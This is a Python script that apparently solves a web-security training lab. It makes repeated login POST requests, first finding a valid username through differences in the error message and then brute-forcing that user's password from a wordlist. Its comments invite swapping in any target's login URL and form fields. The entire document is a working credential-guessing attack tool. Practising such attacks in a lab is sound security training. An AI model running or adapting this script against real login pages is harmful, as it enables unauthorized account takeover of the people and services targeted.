import requests

# Target URLs and Wordlists
login_url = "https://0a4600cc03eb61aa854421bc00cf0075.web-security-academy.net/login"  # Replace with the actual login URL of the lab
usernames_file = "usernames.txt"  # File containing candidate usernames
passwords_file = "passwords.txt"  # File containing candidate passwords


# Function to try logins and check for error messages
def try_username(username, password):
    # Replace these data keys based on the actual login form fields
    data = {
        "username": username,
        "password": password
    }

    # Send POST request
    response = requests.post(login_url, data=data)

    # Check the response to see if the login was successful
    # You may need to check response.text or status code for specific signs of success
    if "Invalid username or password." not in response.text:  # Change condition based on actual failure message
        return response.text
    return None

def try_login(username, password):
    # Replace these data keys based on the actual login form fields
    data = {
        "username": username,
        "password": password
    }

    # Send POST request
    response = requests.post(login_url, data=data)

    # Check the response to see if the login was successful
    # You may need to check response.text or status code for specific signs of success
    if "Invalid username or password" not in response.text:  # Change condition based on actual failure message
        return response.text
    return None



# Step 1: Enumerate Valid Username
print("Enumerating usernames...")

valid_username = None

# Open username wordlist and check each one
with open(usernames_file, "r") as file:
    for username in file:
        username = username.strip()
        print(f"Trying username: {username}")

        # Attempt login with a common or known password to test for user enumeration
        response = try_username(username, "randompassword")

        # Look for the unique error message indicating a valid username
        if response:
            print(f"Valid username found: {username}")
            valid_username = username
            break

if not valid_username:
    print("No valid username found. Exiting.")
    exit()

# Step 2: Brute-force the Password
print("Brute-forcing the password...")

valid_password = None

# Open password wordlist and test each password for the valid username
with open(passwords_file, "r") as file:
    for password in file:
        password = password.strip()
        print(f"Trying password: {password}")

        # Attempt login with the valid username and current password
        response = try_login(valid_username, password)

        # Check if the response indicates a successful login
        if response:
            print(f"Valid password found: {password}")
            valid_password = password
            break

if not valid_password:
    print("Password brute-forcing failed. Exiting.")
    exit()

# Step 3: Access the Account Page
print("Accessing the account page...")

# Re-login with the correct username and password
response = try_login(valid_username, valid_password)

# Output the account page content or any confirmation message
if response:
    print("Successfully logged in!")
    print("Account page content:")
    print(response)
else:
    print("Failed to access the account page.")
